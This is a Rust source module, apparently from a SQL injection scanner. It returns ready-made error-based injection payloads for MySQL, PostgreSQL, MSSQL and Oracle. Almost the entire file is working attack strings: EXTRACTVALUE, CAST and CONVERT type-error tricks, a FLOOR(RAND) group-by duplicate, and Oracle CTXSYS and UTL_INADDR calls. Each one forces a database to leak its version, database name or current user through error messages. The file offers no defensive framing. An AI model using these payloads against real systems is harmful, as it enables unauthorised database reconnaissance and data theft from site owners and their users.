#![deny(unsafe_code)]

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct ErrorPayload {
    pub payload: String,
    pub dbms: String,
}

#[must_use]
pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
    let list: Vec<(&str, &str)> = match dbms {
        Some("mysql") => vec![
            (
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -",
                "mysql",
            ),
            (
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -",
                "mysql",
            ),
        ],
        Some("postgres") => vec![
            ("' AND CAST((SELECT version()) AS int) --", "postgres"),
            (
                "' AND 1=CAST((SELECT current_database()) AS int) --",
                "postgres",
            ),
        ],
        Some("mssql") => vec![
            ("' AND CONVERT(int,@@version) --", "mssql"),
            ("' AND 1=CONVERT(int,DB_NAME()) --", "mssql"),
        ],
        Some("oracle") => vec![
            (
                "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --",
                "oracle",
            ),
            (
                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) --",
                "oracle",
            ),
        ],
        _ => vec![
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version)) -- -", "mysql"),
            ("' AND CAST((SELECT version()) AS int) --", "postgres"),
            ("' AND CONVERT(int,@@version) --", "mssql"),
        ],
    };
    list.into_iter()
        .map(|(p, d)| ErrorPayload {
            payload: p.to_owned(),
            dbms: d.to_owned(),
        })
        .collect()
}
